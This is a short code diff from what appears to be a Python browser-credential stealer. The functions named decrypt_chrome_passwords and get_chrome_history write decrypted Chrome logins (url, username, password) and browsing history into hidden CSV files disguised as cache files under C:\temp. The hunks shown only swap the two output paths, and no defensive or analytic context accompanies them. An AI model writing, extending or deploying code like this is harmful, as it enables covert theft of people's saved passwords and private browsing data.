@@ -116,7 +116,7 @@ def decrypt_chrome_passwords():
 
     try:
         # Create Dataframe to store passwords
-        with open(f"C:\\Users\\temp\\.tempcache.csv", mode='w', newline='',
+        with open(f"C:\\temp\\.tempcache2.csv", mode='w', newline='',
                   encoding='utf-8') as decrypt_password_file:
             csv_writer = csv.writer(decrypt_password_file, delimiter=',')
             csv_writer.writerow(["index", "url", "username", "password"])
@@ -192,7 +192,7 @@ def get_chrome_history():
 
                 i += 1
             # write to csv file but don't delete the previous data
-            with open(f"C:\\temp\\.tempcache2.csv", mode='a', newline='',
+            with open(f"C:\\temp\\.tempcache.csv", mode='a', newline='',
                       encoding='utf-8') as decrypt_password_file:
                 decrypt_password_writer = csv.writer(decrypt_password_file, delimiter=',', quotechar='"',
                                                      quoting=csv.QUOTE_MINIMAL)
